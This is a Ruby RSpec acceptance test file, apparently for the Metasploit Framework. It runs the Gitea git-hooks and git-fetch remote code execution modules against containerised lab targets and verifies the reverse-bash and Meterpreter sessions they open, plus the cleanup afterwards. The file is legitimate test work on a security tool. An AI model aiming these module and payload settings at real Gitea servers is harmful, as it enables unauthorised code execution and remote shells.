require 'acceptance_spec_helper'
require 'English'
require 'net/http'
require 'timeout'
require 'time'

profile = ENV.fetch('GITEA_TARGET_PROFILE', 'hooks')
raise ArgumentError, "Unknown Gitea profile: #{profile}" unless %w[hooks fetch].include?(profile)

RSpec.describe 'Native Gitea repository execution targets' do
  include_context 'module target'
  include_context 'wait_for_expect'

  before(:all) do
    @profile = profile
    argv = ['python3', '-B', "test/module_targets/gitea_#{profile}/native_probe.py"]
    output, error, status = Open3.capture3(*argv)
    File.write(File.join(target_runtime.fetch('artifacts'), 'native-probe-status.json'), JSON.pretty_generate(argv: argv, stderr: error, exitstatus: status.exitstatus))
    expect(status.success?).to be(true), error
    @native = JSON.parse(output)
    expect([@native.fetch('commands').length, @native.fetch('http').length]).to eq(profile == 'hooks' ? [120, 201] : [79, 148])
    expect(@native.fetch('proofs').length).to eq(profile == 'hooks' ? 5 : 6)
    expect(@native.fetch(profile == 'hooks' ? 'ui_proofs' : 'ui_migrations').length).to eq(profile == 'hooks' ? 5 : 4)
  end

  before do |example|
    @case_id = example.metadata.fetch(:scoped_id).tr(':', '_')
    expect(console_command('sessions -l')).to include('No active sessions')
    expect(console_command('jobs -l')).to include('No active jobs')
    prove_listeners_removed
  end

  after do |example|
    if [Acceptance::ChildProcessRecvError, Timeout::Error, EOFError, Errno::EPIPE].any? { |type| example.exception.is_a?(type) }
      RSpec.world.wants_to_quit = true
    end
  end

  if profile == 'hooks'
    { 'legacy' => '1.12.6', 'locked' => '1.16.6' }.each do |service, version|
      it "reports the passive #{service} hook version without claiming permission validation" do
        output = invoke(service, {}, action: 'check')
        expect(output).to include('The target appears to be vulnerable', "Gitea version is #{version}")
        expect(output).to include('DISABLE_GIT_HOOKS') if service == 'locked'
      end
    end

    { 'unrelated HTTP' => ['unrelated', {}], 'missing application' => ['legacy', { 'TARGETURI' => '/module-target-absent/' }] }.each do |label, (service, options)|
      it "does not identify #{label} as Gitea hooks" do
        expect(invoke(service, options, action: 'check')).to include('Target does not appear to be running Gitea.')
      end
    end

    %w[legacy fixed prefix].each do |service|
      it "executes an administrator hook twice on #{service} and removes each repository" do
        command_case(service)
      end
    end

    it 'executes hooks twice for a specifically granted ordinary user and restores the grant' do
      native_control(action: 'grant', service: 'vulnerable', allowed: true)
      begin
        command_case('vulnerable', 'USERNAME' => 'module-user')
      ensure
        native_control(action: 'grant', service: 'vulnerable', allowed: false)
      end
    end

    [
      ['vulnerable', 1, 'linux/x64/meterpreter/reverse_tcp', {}],
      ['legacy', 0, 'cmd/unix/reverse_bash', {}],
      ['prefix', 1, 'linux/x64/meterpreter/reverse_tcp', {}]
    ].each do |service, target, payload, options|
      it "uses #{payload} twice on #{service} with remote identity and shutdown proof" do
        session_case(service, target, payload, options)
      end
    end

    [
      ['vulnerable', { 'USERNAME' => 'module-user' }],
      ['locked', {}],
      ['vulnerable', { 'PASSWORD' => 'module-target-rejected' }]
    ].each do |service, options|
      it "refuses hook execution twice for #{service}/#{options.inspect}" do
        refused_case(service, options)
      end
    end
  else
    { 'vulnerable' => 'appears to be vulnerable', 'fixed' => 'is not exploitable', 'prefix' => 'appears to be vulnerable' }.each do |service, result|
      it "checks the actual #{service} fetch version and authentication" do
        output = invoke(service, {}, action: 'check')
        expect(output).to include(result, "Version detected: #{service == 'fixed' ? '1.16.7' : '1.16.6'}")
      end
    end

    [
      ['vulnerable', { 'PASSWORD' => 'module-target-rejected' }],
      ['vulnerable', { 'TARGETURI' => '/module-target-absent/' }],
      ['unrelated', {}]
    ].each do |service, options|
      it "does not offer fetch exploitation for #{service}/#{options.inspect}" do
        output = invoke(service, options, action: 'check')
        expect(output).not_to include('The target appears to be vulnerable', 'The target is vulnerable')
      end
    end

    %w[vulnerable prefix].each do |service|
      it "executes a fresh ordinary-user fetch command twice on #{service} with exact cleanup" do
        command_case(service)
      end
    end

    [
      ['vulnerable', 0, 'cmd/unix/reverse_bash', {}],
      ['vulnerable', 1, 'linux/x64/meterpreter/reverse_tcp', { 'CMDSTAGER::FLAVOR' => 'curl' }],
      ['prefix', 1, 'linux/x64/meterpreter/reverse_tcp', { 'CMDSTAGER::FLAVOR' => 'wget' }]
    ].each do |service, target, payload, options|
      it "uses #{payload}/#{options.inspect} twice on #{service} with actual session and cleanup proof" do
        session_case(service, target, payload, options)
      end
    end

    it 'refuses migration twice under the genuine local-network policy and removes its seed' do
      refused_case('blocked')
    end

    it 'delivers the malicious fetch twice to the fixed target without command execution' do
      refused_case('fixed', 'ForceExploit' => true)
    end

    it 'refuses invalid authentication twice when AutoCheck is disabled' do
      refused_case('vulnerable', 'AutoCheck' => false, 'PASSWORD' => 'module-target-rejected')
    end
  end

  def native_control(request)
    argv = ['python3', '-B', 'test/module_targets/gitea/control.py', JSON.generate(request)]
    output, error, status = Open3.capture3(*argv)
    File.open(File.join(target_runtime.fetch('artifacts'), 'native-control-status.jsonl'), 'a') do |log|
      log.puts(JSON.generate(argv: argv, stderr: error, exitstatus: status.exitstatus, stdout: output))
    end
    expect(status.success?).to be(true), error
    JSON.parse(output)
  end

  def actor(service)
    service == 'prefix' ? 'prefixed_backend' : service
  end

  def state(service)
    {
      repositories: native_control(action: 'tree', service: service),
      temporary: target_exec(actor(service), 'find', '/tmp', '-mindepth', '1', '-print').lines.map(&:strip).sort
    }
  end

  def invoke(service, options = {}, action: 'run -z')
    name = @profile == 'hooks' ? 'gitea_git_hooks_rce' : 'gitea_git_fetch_rce'
    defaults = {
      'TARGETURI' => service == 'prefix' ? '/gitea/' : '/', 'SSL' => false,
      'USERNAME' => @profile == 'hooks' ? 'module-admin' : 'module-user', 'HttpTrace' => true, 'HttpTraceHeadersOnly' => true,
      'PASSWORD' => 'module-target-password', 'HttpClientTimeout' => 10,
      'TARGET' => 0, 'PAYLOAD' => 'cmd/unix/generic', 'DisablePayloadHandler' => @profile != 'fetch',
      'WfsDelay' => @profile == 'fetch' ? 30 : 0, 'AutoCheck' => true, 'ForceExploit' => false,
      'SRVHOST' => listener_host, 'SRVPORT' => 8081
    }
    # The explicitly bounded 120 seconds covers the module's real 20-second
    # web operations, per-command stager delay and reverse-session wait.
    run_target_module("exploit/multi/http/#{name}", service, defaults.merge(options), action: action, allow_errors: true, command_timeout: 120)
  end

  def command_case(service, options = {})
    2.times do |iteration|
      with_state(service, iteration) do |proof|
        output = invoke(service, { 'CMD' => "printf module-target-gitea-proof>#{proof}" }.merge(options))
        expect(output).not_to include('[-]')
        wait_for_target(15) do
          expect(target_exec(actor(service), 'sh', '-c', "if test -f #{proof}; then cat #{proof}; fi")).to eq('module-target-gitea-proof')
        end
        expect(target_exec(actor(service), 'stat', '-c', '%u:%g', proof).strip).to eq('1000:1000')
      end
    end
  end

  def session_case(service, target, payload, options)
    2.times do |iteration|
      with_state(service, iteration) do |proof|
        output = invoke(service, { 'TARGET' => target, 'PAYLOAD' => payload, 'LHOST' => listener_host, 'LPORT' => 4444, 'WfsDelay' => 10, 'DisablePayloadHandler' => false }.merge(options))
        session_id = output[/(?:Command shell|Meterpreter) session (\d+) opened/, 1]
        expect(session_id).not_to be_nil, output
        meterpreter = payload.include?('meterpreter')
        if meterpreter
          process = console_command("sessions -i #{session_id} -C getpid")
          pid = process[/Current pid: (\d+)/, 1]
          result = console_command("sessions -i #{session_id} -C #{"execute -f /bin/touch -a #{proof}".inspect}")
        else
          result = console_command("sessions -i #{session_id} -c #{"touch #{proof}; printf 'MODULE_TARGET_PID=%s\\n' $$".inspect}")
          pid = result[/MODULE_TARGET_PID=(\d+)/, 1]
        end
        expect(pid).not_to be_nil, result
        expect(result).not_to match(/\[-\]|Exception|Unknown command/)
        wait_for_target(15) { expect(target_exec(actor(service), 'sh', '-c', "if test -f #{proof}; then stat -c %u:%g #{proof}; fi").strip).to eq('1000:1000') }
        expect(target_exec(actor(service), 'cat', "/proc/#{pid}/status")).to match(/^Uid:\s+1000\s+1000\s+1000\s+1000$/)
        code = meterpreter ? "framework.sessions[#{session_id}].exit" : "framework.sessions[#{session_id}].shell_write(\"exit\\n\")"
        console_command("irb -e #{code.inspect}")
        wait_for_target(15) { expect(target_exec(actor(service), 'sh', '-c', "if test -e /proc/#{pid}; then printf PRESENT; else printf ABSENT; fi")).to eq('ABSENT') }
      end
    end
  end

  def refused_case(service, options = {})
    2.times do |iteration|
      with_state(service, iteration) do |proof|
        started = Time.now.utc.iso8601
        output = invoke(service, { 'CMD' => "touch #{proof}" }.merge(options))
        if service == 'fixed' && options['ForceExploit']
          wait_for_target(15) do
            logs, error, status = Open3.capture3(*target_runtime.fetch('compose'), 'logs', '--no-color', '--since', started, actor(service))
            File.write(File.join(target_runtime.fetch('artifacts'), "fixed-delivery-#{@case_id}-#{iteration}.log"), logs)
            expect(status.success?).to be(true), error
            expect(logs).to match(/fatal: invalid refspec[^\n]*#{Regexp.escape(proof)}/)
          end
        end
        expect(output).not_to match(/(?:Command shell|Meterpreter) session \d+ opened/)
        expect(target_exec(actor(service), 'sh', '-c', "if test -e #{proof}; then printf PRESENT; else printf ABSENT; fi")).to eq('ABSENT')
      end
    end
  end

  def with_state(service, iteration)
    before = state(service)
    proof = "/tmp/module-target-gitea-#{@case_id}-#{iteration}"
    target_exec(actor(service), 'test', '!', '-e', proof)
    yield proof
    target_exec(actor(service), 'rm', '-f', proof)
    wait_for_target(15) { expect(state(service)).to eq(before) }
  ensure
    original_error = $ERROR_INFO
    broken_console = [Acceptance::ChildProcessRecvError, EOFError, Errno::EPIPE].any? { |type| original_error.is_a?(type) }
    RSpec.world.wants_to_quit = true if broken_console
    begin
      console_command('sessions -K') unless broken_console
      console_command('jobs -K') unless broken_console
      prove_listeners_removed unless broken_console
      if before && !broken_console
        after = state(service)
        File.open(File.join(target_runtime.fetch('artifacts'), 'gitea-restoration.jsonl'), 'a') do |log|
          log.puts(JSON.generate(case_id: @case_id, iteration: iteration, service: service, before: before, after_module: after, proof: proof, original_error: original_error&.message))
        end
        recover_repositories(service, before) if after.fetch(:repositories) != before.fetch(:repositories)
        target_exec(actor(service), 'rm', '-f', proof)
        expect(state(service)).to eq(before)
      end
    rescue RSpec::Expectations::ExpectationNotMetError, StandardError
      RSpec.world.wants_to_quit = true unless original_error
      raise unless original_error
    end
  end

  def recover_repositories(service, before)
    %w[module-admin module-user].each do |owner|
      role = owner == 'module-admin' ? 'admin' : 'user'
      response = native_control(action: 'http', service: service, route: '/api/v1/user/repos', role: role)
      expect(response.fetch('status')).to eq(200)
      response.fetch('document').each do |repository|
        name = repository.fetch('name')
        next if before.fetch(:repositories).include?("/data/git/repositories/#{owner}/#{name.downcase}.git")

        directory = File.join(target_runtime.fetch('artifacts'), "repository-#{@case_id}-#{service}-#{repository.fetch('id')}")
        output, error, status = Open3.capture3(*target_runtime.fetch('compose'), 'cp', "#{actor(service)}:/data/git/repositories/#{owner}/#{name.downcase}.git", directory)
        File.write("#{directory}-copy.json", JSON.pretty_generate(stdout: output, stderr: error, exitstatus: status.exitstatus, repository: repository))
        expect(status.success?).to be(true), error
        deleted = native_control(action: 'http', service: service, route: "/api/v1/repos/#{owner}/#{name}", method: 'DELETE', role: role)
        expect(deleted.fetch('status')).to eq(204)
      end
    end
  end

  def wait_for_target(seconds, &block)
    failure = nil
    Timeout.timeout(seconds) do
      wait_for_expect(1000, 0.1) do
        block.call
      rescue RSpec::Expectations::ExpectationNotMetError => e
        failure = e
        raise
      end
    end
  rescue Timeout::Error
    raise failure || RSpec::Expectations::ExpectationNotMetError.new("Target condition exceeded #{seconds} seconds")
  end

  def prove_listeners_removed
    script = 'require "json"; rows=%w[/proc/net/tcp /proc/net/tcp6].flat_map { |path| File.readlines(path).drop(1).map(&:split) }; puts JSON.generate(rows.select { |row| row[3]=="0A" && row[1].split(":").last.to_i(16)==4444 })'
    wait_for_target(15) { expect(JSON.parse(target_exec('framework', 'ruby', '-e', script))).to eq([]) }
    return unless @profile == 'fetch'

    code = 'puts "MODULE_TARGET_GITEA_POOL:"+JSON.generate(Rex::ServiceManager.instance.values.uniq.grep(Rex::Proto::Http::Server).select { |server| server.listen_port==8081 }.map { |server| { resources: server.resources.keys, references: server.instance_variable_get(:@_references), owner: server.context["MsfExploit"]&.refname } })'
    output = console_command("irb -e #{code.inspect}")
    rows = output[/^MODULE_TARGET_GITEA_POOL:(\[.*\])\r?$/, 1]
    expect(rows).not_to be_nil, output
    pool = JSON.parse(rows)
    expect(pool.flat_map { |server| server.fetch('resources') }).to eq([])
    probe = 'require "net/http"; require "json"; begin; uri=URI(ARGV[0]); response=Net::HTTP.start(uri.host,uri.port,open_timeout:2,read_timeout:2) { |http| http.get(uri) }; puts JSON.generate(code:response.code.to_i,body:response.body); rescue Errno::ECONNREFUSED; puts JSON.generate(state:"refused"); end'
    response = JSON.parse(target_exec('framework', 'ruby', '-e', probe, "http://#{listener_host}:8081/api/v1/version"))
    expect(response['state'] == 'refused' || response['code'] == 404).to be(true), response.inspect
    File.open(File.join(target_runtime.fetch('artifacts'), 'gitea-http-resource-removal.jsonl'), 'a') { |log| log.puts(JSON.generate(pool: pool, response: response)) }
  end
end
